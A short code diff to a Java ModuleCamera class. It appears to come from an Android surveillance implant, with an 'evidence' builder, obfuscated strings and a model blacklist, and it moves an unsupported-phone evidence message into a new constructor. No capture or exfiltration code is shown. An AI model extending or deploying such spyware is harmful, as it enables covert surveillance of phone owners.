@@ -40,6 +40,18 @@ public class ModuleCamera extends BaseInstantModule {
 			M.e("LG-D405")
 	};
 
+	public ModuleCamera() {
+		super();
+		for ( String model: blacklistedPhones) {
+			if (Build.MODEL.equalsIgnoreCase(model)) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (actualStart): Phone: " + Build.MODEL + " not supported");
+				}
+				EvidenceBuilder.info(M.e("camera module not supported on this phone"));
+			}
+		}
+	}
+
 	public static ModuleCamera self() {
 		return (ModuleCamera) ManagerModule.self().get(M.e("camera"));
 	}
@@ -81,7 +93,6 @@ public class ModuleCamera extends BaseInstantModule {
 						Check.log(TAG + " (actualStart): Phone: " + Build.MODEL + " not supported");
 					}
 					addStop(Status.STOP_REASON_PHONE_MODEL);
-					EvidenceBuilder.info(M.e("camera module not supported on this phone"));
 					return;
 				}
 			}
